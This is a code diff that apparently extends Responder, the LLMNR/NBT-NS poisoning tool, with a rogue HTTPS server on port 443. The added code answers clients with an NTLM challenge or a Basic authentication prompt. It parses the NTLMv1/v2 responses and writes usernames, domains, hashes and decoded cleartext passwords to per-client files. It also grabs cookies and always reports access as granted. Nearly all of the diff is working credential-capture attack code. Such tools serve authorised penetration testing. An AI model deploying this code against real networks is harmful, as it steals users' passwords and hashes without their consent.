@@ -20,7 +20,7 @@ import sys,struct,SocketServer,re,optparse,socket,thread,Fingerprint,random,os
 from Fingerprint import RunSmbFinger,OsNameClientVersion
 from odict import OrderedDict
 from socket import inet_aton
-from random import randrange, choice
+from random import randrange
 
 parser = optparse.OptionParser(usage='python %prog -i 10.20.30.40 -b 1 -s On -r 0',
                                prog=sys.argv[0],
@@ -30,6 +30,8 @@ parser.add_option('-i','--ip', action="store", help="The ip address to redirect 
 parser.add_option('-b', '--basic',action="store", help="Set this to 1 if you want to return a Basic HTTP authentication. 0 will return an NTLM authentication.This option is mandatory.", metavar="0",dest="Basic", choices=['0','1'], default="0")
 
 parser.add_option('-s', '--http',action="store", help="Set this to On or Off to start/stop the HTTP server. Default value is On", metavar="Off",dest="on_off", choices=['On','Off'], default="On")
+
+parser.add_option('--ssl',action="store", help="Set this to On or Off to start/stop the HTTPS server. Default value is On", metavar="Off",dest="SSL_On_Off", choices=['On','Off'], default="On")
 
 parser.add_option('-S', '--smb',action="store", help="Set this to On or Off to start/stop the SMB server. Default value is On", metavar="Off",dest="SMB_on_off", choices=['On','Off'], default="On")
 
@@ -74,6 +76,7 @@ logging.warning('Responder Started')
 OURIP = options.OURIP
 Basic = options.Basic
 On_Off = options.on_off.upper()
+SSL_On_Off = options.SSL_On_Off.upper()
 SMB_On_Off = options.SMB_on_off.upper()
 SQL_On_Off = options.SQL_on_off.upper()
 FTP_On_Off = options.FTP_On_Off.upper()
@@ -113,7 +116,7 @@ Challenge = ""
 for i in range(0,len(NumChal),2):
     Challenge += NumChal[i:i+2].decode("hex")
 
-Show_Help("[+]NBT-NS & LLMNR responder started\nGlobal Parameters set:\nChallenge set is: %s\nWPAD Proxy Server is:%s\nHTTP Server is:%s\nSMB Server is:%s\nSMB LM support is set to:%s\nSQL Server is:%s\nFTP Server is:%s\nDNS Server is:%s\nLDAP Server is:%s\nFingerPrint Module is:%s\n"%(NumChal,WPAD_On_Off,On_Off,SMB_On_Off,LM_On_Off,SQL_On_Off,FTP_On_Off,DNS_On_Off,LDAP_On_Off,Finger_On_Off))
+Show_Help("[+]NBT-NS & LLMNR responder started\nGlobal Parameters set:\nChallenge set is: %s\nWPAD Proxy Server is:%s\nHTTP Server is:%s\nHTTPS Server is:%s\nSMB Server is:%s\nSMB LM support is set to:%s\nSQL Server is:%s\nFTP Server is:%s\nDNS Server is:%s\nLDAP Server is:%s\nFingerPrint Module is:%s\n"%(NumChal,WPAD_On_Off,On_Off,SSL_On_Off,SMB_On_Off,LM_On_Off,SQL_On_Off,FTP_On_Off,DNS_On_Off,LDAP_On_Off,Finger_On_Off))
 
 #Simple NBNS Services.
 W_REDIRECT   = "\x41\x41\x00"
@@ -1047,6 +1050,131 @@ class HTTPProxy(SocketServer.BaseRequestHandler):
            self.request.close()
 
 ##################################################################################
+#HTTPS Server
+##################################################################################
+from OpenSSL import SSL
+#Parse NTLMv1/v2 hash.
+def ParseHTTPSHash(data,client):
+    LMhashLen = struct.unpack('<H',data[12:14])[0]
+    LMhashOffset = struct.unpack('<H',data[16:18])[0]
+    LMHash = data[LMhashOffset:LMhashOffset+LMhashLen].encode("hex").upper()
+    NthashLen = struct.unpack('<H',data[20:22])[0]
+    NthashOffset = struct.unpack('<H',data[24:26])[0]
+    NTHash = data[NthashOffset:NthashOffset+NthashLen].encode("hex").upper()
+    if NthashLen == 24:
+       print "[+]HTTPS NTLMv1 hash captured from :",client
+       logging.warning('[+]HTTPS NTLMv1 hash captured from :%s'%(client))
+       NtHash = data[NthashOffset:NthashOffset+NthashLen].encode("hex").upper()
+       HostNameLen = struct.unpack('<H',data[46:48])[0]
+       HostNameOffset = struct.unpack('<H',data[48:50])[0]
+       Hostname = data[HostNameOffset:HostNameOffset+HostNameLen].replace('\x00','')
+       print "Hostname is :", Hostname
+       logging.warning('[+]HTTPS NTLMv1 Hostname is :%s'%(Hostname))
+       UserLen = struct.unpack('<H',data[36:38])[0]
+       UserOffset = struct.unpack('<H',data[40:42])[0]
+       User = data[UserOffset:UserOffset+UserLen].replace('\x00','')
+       print "User is :", data[UserOffset:UserOffset+UserLen].replace('\x00','')
+       logging.warning('[+]HTTPS NTLMv1 User is :%s'%(data[UserOffset:UserOffset+UserLen].replace('\x00','')))
+       outfile = "HTTPS-NTLMv1-Client-"+client+".txt"
+       WriteHash = User+"::"+Hostname+":"+LMHash+":"+NtHash+":"+NumChal
+       WriteData(outfile,WriteHash, User+"::"+Hostname)
+       print "Complete hash is : ", WriteHash
+       logging.warning('[+]HTTPS NTLMv1 Complete hash is :%s'%(WriteHash))
+    if NthashLen > 24:
+       print "[+]HTTPS NTLMv2 hash captured from :",client
+       logging.warning('[+]HTTPS NTLMv2 hash captured from :%s'%(client))
+       NthashLen = 64
+       DomainLen = struct.unpack('<H',data[28:30])[0]
+       DomainOffset = struct.unpack('<H',data[32:34])[0]
+       Domain = data[DomainOffset:DomainOffset+DomainLen].replace('\x00','')
+       print "Domain is : ", Domain
+       logging.warning('[+]HTTPS NTLMv2 Domain is :%s'%(Domain))
+       UserLen = struct.unpack('<H',data[36:38])[0]
+       UserOffset = struct.unpack('<H',data[40:42])[0]
+       User = data[UserOffset:UserOffset+UserLen].replace('\x00','')
+       print "User is :", User
+       logging.warning('[+]HTTPS NTLMv2 User is : %s'%(User))
+       HostNameLen = struct.unpack('<H',data[44:46])[0]
+       HostNameOffset = struct.unpack('<H',data[48:50])[0]
+       HostName =  data[HostNameOffset:HostNameOffset+HostNameLen].replace('\x00','')
+       print "Hostname is :", HostName
+       logging.warning('[+]HTTPS NTLMv2 Hostname is :%s'%(HostName))
+       outfile = "HTTPS-NTLMv2-Client-"+client+".txt"
+       WriteHash = User+"::"+Domain+":"+NumChal+":"+NTHash[:32]+":"+NTHash[32:]
+       WriteData(outfile,WriteHash, User+"::"+Domain)
+       print "Complete hash is : ", WriteHash
+       logging.warning('[+]HTTPS NTLMv2 Complete hash is :%s'%(WriteHash))
+
+#Handle HTTPS packet sequence.
+def HTTPSPacketSequence(data,client):
+    a = re.findall('(?<=Authorization: NTLM )[^\\r]*', data)
+    b = re.findall('(?<=Authorization: Basic )[^\\r]*', data)
+    if a:
+       packetNtlm = b64decode(''.join(a))[8:9]
+       if packetNtlm == "\x01":
+          GrabCookie(data,client)
+          r = NTLM_Challenge(ServerChallenge=Challenge)
+          r.calculate()
+          t = IIS_NTLM_Challenge_Ans()
+          t.calculate(str(r))
+          buffer1 = str(t)                    
+          return buffer1
+       if packetNtlm == "\x03":
+          NTLM_Auth= b64decode(''.join(a))
+          ParseHTTPSHash(NTLM_Auth,client)
+          buffer1 = str(IIS_Auth_Granted())
+          return buffer1
+    if b:
+       GrabCookie(data,client)
+       outfile = "HTTPS-Clear-Text-Password-"+client+".txt"
+       WriteData(outfile,b64decode(''.join(b)), b64decode(''.join(b)))
+       print "[+]HTTPS-User & Password:", b64decode(''.join(b))
+       logging.warning('[+]HTTPS-User & Password: %s'%(b64decode(''.join(b))))
+       buffer1 = str(IIS_Auth_Granted())
+       return buffer1
+
+    else:
+       return str(Basic_Ntlm(Basic))
+
+class SSlSock(SocketServer.ThreadingMixIn, SocketServer.TCPServer):
+    def __init__(self, server_address, RequestHandlerClass):
+        SocketServer.BaseServer.__init__(self, server_address, RequestHandlerClass)
+        ctx = SSL.Context(SSL.SSLv3_METHOD)
+        cert = 'Certs/responder.crt'
+        key =  'Certs/responder.key'
+        ctx.use_privatekey_file(key)
+        ctx.use_certificate_file(cert)
+        self.socket = SSL.Connection(ctx, socket.socket(self.address_family, self.socket_type))
+        self.server_bind()
+        self.server_activate()
+
+    def shutdown_request(self,request):
+        try:
+           request.shutdown()
+        except:
+           pass
+
+class DoSSL(SocketServer.StreamRequestHandler):
+    def setup(self):
+        self.exchange = self.request
+        self.rfile = socket._fileobject(self.request, "rb", self.rbufsize)
+        self.wfile = socket._fileobject(self.request, "wb", self.wbufsize)
+
+    def handle(self):
+        try:
+           while True:
+              data = self.exchange.recv(8092)
+              self.exchange.settimeout(0.5)
+              buff = WpadCustom(data,self.client_address[0])
+              if buff:
+                 self.exchange.send(buff)
+              else:
+                 buffer0 = HTTPSPacketSequence(data,self.client_address[0])      
+                 self.exchange.send(buffer0)
+        except:
+            pass
+
+##################################################################################
 #FTP Stuff
 ##################################################################################
 class FTPPacket(Packet):
@@ -1202,6 +1330,13 @@ def Is_HTTP_On(on_off):
        return False
 
 #Function name self-explanatory
+def Is_HTTPS_On(SSL_On_Off):
+    if SSL_On_Off == "ON":
+       return thread.start_new(serve_thread_SSL,('', 443,DoSSL))
+    if SSL_On_Off == "OFF":
+       return False
+
+#Function name self-explanatory
 def Is_WPAD_On(on_off):
     if on_off == "ON":
        return thread.start_new(serve_thread_tcp,('', 3141,HTTPProxy))
@@ -1264,10 +1399,18 @@ def serve_thread_tcp(host, port, handler):
 	except:
 		print "Error starting TCP server on port " + str(port) + ". Check that you have the necessary permissions (i.e. root) and no other servers are running."
 
+def serve_thread_SSL(host, port, handler):
+	try:
+		server = SSlSock((host, port), handler)
+		server.serve_forever()
+	except:
+		print "Error starting TCP server on port " + str(port) + ". Check that you have the necessary permissions (i.e. root) and no other servers are running."
+
 def main():
     try:
       Is_FTP_On(FTP_On_Off)
       Is_HTTP_On(On_Off)
+      Is_HTTPS_On(SSL_On_Off)
       Is_WPAD_On(WPAD_On_Off)
       Is_SMB_On(SMB_On_Off)
       Is_SQL_On(SQL_On_Off)
